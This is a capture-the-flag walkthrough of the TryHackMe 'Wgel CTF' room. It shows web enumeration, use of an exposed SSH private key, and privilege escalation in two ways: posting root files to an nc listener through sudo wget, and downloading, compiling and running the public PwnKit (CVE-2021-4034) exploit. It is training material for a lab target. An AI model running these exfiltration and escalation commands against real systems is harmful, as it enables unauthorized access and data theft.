# Wgel CTF

Room: https://tryhackme.com/room/wgelctf

Have fun with this easy box.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/wgelctf.md

---

## Target

```text
10.67.161.176
```

---

## Port scanning

I started with a full TCP port scan and service detection.

```bash
root@ip-10-67-104-146:~# nmap -sV -p- 10.67.161.176
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-26 09:10 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.67.161.176
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.60 seconds
```

Only two ports were open:

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |

The SSH version is old enough to make username enumeration worth thinking about, but the actual room path does not require exploiting SSH directly.

---

## Web enumeration

The web server was running on port 80.

While checking the page source, I found an HTML comment.

```text
Comment found on http://10.67.161.176
```

```html
<!-- Jessie don't forget to udate the webiste -->
```

This comment is important because it gives us a likely username:

```text
jessie
```

The comment also contains a spelling mistake, but the useful part is the name.

---

## Directory brute forcing

Next, I ran Gobuster against the web root.

```bash
sudo: unable to resolve host ip-10-67-104-146: Name or service not known
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.161.176
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11374]
/.html                (Status: 403) [Size: 278]
/sitemap              (Status: 301) [Size: 316] [--> http://10.67.161.176/sitemap/]
/server-status        (Status: 403) [Size: 278]

===============================================================
Finished
===============================================================
Progress: 1091375 / 1091380 (100.00%)
```

The interesting result was:

```text
/sitemap
```

I then ran another Gobuster scan against `/sitemap`.

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.161.176/sitemap
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.ssh                 (Status: 301) [Size: 321] [--> http://10.67.161.176/sitemap/.ssh/]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 320] [--> http://10.67.161.176/sitemap/css/]
/fonts                (Status: 301) [Size: 322] [--> http://10.67.161.176/sitemap/fonts/]
/images               (Status: 301) [Size: 323] [--> http://10.67.161.176/sitemap/images/]
/js                   (Status: 301) [Size: 319] [--> http://10.67.161.176/sitemap/js/]

===============================================================
Finished
===============================================================
Progress: 20469 / 20470 (100.00%)
```

The key finding was:

```text
/sitemap/.ssh/
```

A `.ssh` directory being exposed through the web server is a major issue. Visiting that directory revealed an `id_rsa` file.

---

## Downloading the SSH key

I downloaded the exposed private key.

```bash
wget http://10.67.153.144/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

The `chmod 600` step is required because SSH refuses to use private keys that are too open.

If the permissions are wrong, SSH may show an error similar to:

```text
Permissions 0605 for 'id_rsa' are too open.
```

---

## A short rabbit hole: building possible usernames

At this point, I briefly forgot about the `jessie` comment and tried extracting names from the site to generate likely usernames.

I created a names file.

```bash
nano names.txt
```

The extracted names were:

```text
Dave Miller
Jennie Thompson
Cameron Svensson
Emily Turner
Adam Morris
Noah Nelson
Dorothy Murphy
```

I then used the following Python script to create common username formats.

```python
#!/usr/bin/env python3

import sys

def clean(value):
    return value.strip().replace("-", "").replace("'", "")

def username_formats(first, last):
    raw_f = clean(first)
    raw_l = clean(last)

    variants = set()

    base_pairs = [
        [raw_f.lower(), raw_l.lower()],
        [raw_f.capitalize(), raw_l.capitalize()],
        [raw_f.upper(), raw_l.upper()],
        [raw_f.capitalize(), raw_l.lower()],
        [raw_f.lower(), raw_l.capitalize()],
    ]

    for f, l in base_pairs:
        variants.update({
            f"{f}{l}",
            f"{f}.{l}",
            f"{f}_{l}",
            f"{f}-{l}",
            f"{f[0]}{l}",
            f"{f[0]}.{l}",
            f"{f[0]}_{l}",
            f"{f}{l[0]}",
            f"{f}.{l[0]}",
            f"{l}{f}",
            f"{l}.{f}",
            f"{l}_{f}",
            f"{l}{f[0]}",
            f"{l}.{f[0]}",
            f"{f}",
            f"{l}",
        })

    return variants

if len(sys.argv) != 3:
    print("Usage: python3 make_usernames.py names.txt usernames.txt")
    sys.exit(1)

usernames = set()

with open(sys.argv[1], "r", encoding="utf-8") as f:
    for line in f:
        parts = line.strip().split()

        if len(parts) < 2:
            continue

        first = parts[0]
        last = parts[-1]

        usernames.update(username_formats(first, last))

with open(sys.argv[2], "w", encoding="utf-8") as f:
    for username in sorted(usernames):
        f.write(username + "\n")

print(f"Created {len(usernames)} usernames in {sys.argv[2]}")
```

Run it like this:

```bash
python3 make_usernames.py names.txt usernames.txt
```

Then I tried each generated username with the private key.

```bash
while read user; do
  echo "[*] Trying $user"

  ssh -i id_rsa \
    -o BatchMode=yes \
    -o PasswordAuthentication=no \
    -o PubkeyAuthentication=yes \
    -o PreferredAuthentications=publickey \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    "$user@10.67.161.176" "id" 2>/dev/null

  if [ $? -eq 0 ]; then
    echo "[+] Key worked for: $user"
    break
  fi
done < usernames.txt
```

This did not work.

The mistake was that the username had already been leaked in the HTML comment.

---

## SSH access as jessie

Using the leaked username and the exposed private key, I logged in as `jessie`.

```bash
ssh -i id_rsa  jessie@10.67.161.176
```

Successful login:

```bash
root@ip-10-67-104-146:~/Downloads# ssh -i id_rsa jessie@10.67.153.144
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

Last login: Sun Apr 26 13:56:06 2026 from 10.67.104.146
jessie@CorpOne:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c6xxxxxxxxxxxxxxxxxx8ff6
jessie@CorpOne:~/Documents$
```

The user flag was located at:

```text
/home/jessie/Documents/user_flag.txt
```

---

## Privilege escalation enumeration

I checked sudo permissions.

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

This showed that `jessie` can run `/usr/bin/wget` as root without a password.

```text
(root) NOPASSWD: /usr/bin/wget
```

That is enough to read files as root by making `wget` upload them to our attacking machine.

---

## Privilege escalation with sudo wget

GTFOBins has an entry for `wget`.

```text
https://gtfobins.org/gtfobins/wget/#file-upload
```

The useful idea is that `wget` can send a local file using `--post-file`.

Because `jessie` can run `/usr/bin/wget` as root, we can make `wget` read `/root/root_flag.txt` and POST it to our listener.

On the attacking machine, I started a listener.

```bash
nc -lvnp 8002
```

On the target, I ran `wget` as root.

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://Attackbox:8002/
```

The listener received the flag in the HTTP request body.

```bash
nc -lvnp 8002
Listening on 0.0.0.0 8002
Connection received on 10.67.153.144 54774
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.67.104.146:8002
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968xxxxxxxxxxxxxxxxxxxxxx3d
```

That gives the root flag without needing a root shell.

---

## Notes on failed wget shell method

I also tried the GTFOBins `--use-askpass` shell method.

```bash
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/x
chmod +x /tmp/x
sudo wget --use-askpass=/tmp/x 0
```

But this target's version of `wget` did not support the option.

```text
wget: unrecognized option '--use-askpass=/tmp/x'
Usage: wget [OPTION]... [URL]...
```

So the `--post-file` method was the correct `wget` route here.

---

## Extra enumeration because the box is old

Since this is an old CTF, I also checked for other privilege escalation paths.

I looked for SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

I checked `pkexec`.

```bash
/usr/bin/pkexec --version
pkexec version 0.105
```

I also checked the architecture.

```bash
uname -m
i686
```

This means the target is 32-bit x86.

`pkexec version 0.105` is interesting because of PwnKit, also known as CVE-2021-4034. However, version alone is not always enough to prove vulnerability because some distributions backport security patches while keeping older version numbers.

In this CTF, PwnKit worked, but the exploit had to be compiled for 32-bit.

---

## Alternative root path: PwnKit on i686

On the attack box, I installed the required 32-bit build dependencies.

```bash
sudo apt install gcc-multilib libc6-dev-i386
```

Then I cloned the PwnKit exploit.

```bash
git clone https://github.com/ly4k/PwnKit && cd PwnKit
```

Because the target was `i686`, I compiled the shared object as 32-bit.

```bash
gcc -m32 -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
```

I hosted the file from the attack box.

```bash
python3 -m http.server
```

On the target, I downloaded it into `/tmp`.

```bash
cd /tmp
wget http://10.67.104.146:8000/PwnKit
```

Then I made it executable and ran it.

```bash
jessie@CorpOne:/tmp$ chmod +x PwnKit 
jessie@CorpOne:/tmp$ ./PwnKit 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@CorpOne:/tmp# whoami
root
root@CorpOne:/tmp# cd /root
root@CorpOne:~# ls
root_flag.txt
root@CorpOne:~# cat root_flag.txt 
b1b9xxxxxxxxxxxxx9263d
```

This confirmed the target was vulnerable to the PwnKit route as well.

---

## Why the first PwnKit compile failed

I first compiled the file like this:

```bash
gcc -shared test.c -o test -Wl,-e,entry -fPIC
```

That created a binary for my attack box architecture, not the target architecture.

When trying to run a 64-bit file on the target, the target returned:

```text
cannot execute binary file: Exec format error
```

The reason was the architecture mismatch.

The target was:

```text
i686
```

So the exploit needed to be built with:

```bash
gcc -m32
```

When trying to compile with `-m32`, I hit this error:

```text
In file included from /usr/include/dirent.h:25,
                 from test.c:5:
/usr/include/features.h:461:12: fatal error: sys/cdefs.h: No such file or directory
  461 | #  include <sys/cdefs.h>
```

That meant the 32-bit libc development headers were missing.

The fix was:

```bash
sudo apt install gcc-multilib libc6-dev-i386
```

After that, the 32-bit compile worked.

---

## Final attack chain

1. Scan all TCP ports with Nmap.
2. Find SSH on port 22 and Apache on port 80.
3. Check the web page source.
4. Find the comment leaking `jessie`.
5. Run Gobuster against the web root.
6. Discover `/sitemap`.
7. Run Gobuster against `/sitemap`.
8. Discover `/sitemap/.ssh/`.
9. Download `id_rsa`.
10. Fix key permissions with `chmod 600`.
11. SSH in as `jessie`.
12. Read the user flag from `~/Documents/user_flag.txt`.
13. Run `sudo -l`.
14. Find that `jessie` can run `/usr/bin/wget` as root without a password.
15. Start a listener on the attack box.
16. Use `sudo /usr/bin/wget --post-file=/root/root_flag.txt` to POST the root flag back to the listener.
17. Optionally confirm an alternate root path through PwnKit by compiling for `i686`.

---

## Key takeaways

The main vulnerability chain was not complicated, but it shows why basic web enumeration matters.

The room exposed two critical pieces of information:

```text
Username: jessie
Private key: /sitemap/.ssh/id_rsa
```

The privilege escalation was caused by unsafe sudo permissions:

```text
(root) NOPASSWD: /usr/bin/wget
```

Even though OpenSSH 7.2p2 and `pkexec version 0.105` are both interesting, the intended route is much simpler:

```text
exposed SSH key plus leaked username, then sudo wget file exfiltration
```
